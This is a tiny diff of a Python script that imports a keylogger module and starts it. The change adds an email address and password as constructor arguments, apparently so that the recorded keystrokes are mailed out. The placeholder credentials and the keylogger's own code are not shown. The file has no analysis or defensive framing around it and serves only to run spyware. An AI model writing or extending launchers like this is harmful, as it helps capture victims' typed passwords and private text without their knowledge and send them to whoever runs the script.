@@ -2,5 +2,7 @@
 
 import keylogger
 
-keylogger = keylogger.Keylogger()
+email = "email@gmail.com"
+password = "password"
+keylogger = keylogger.Keylogger(email, password)
 keylogger.start()
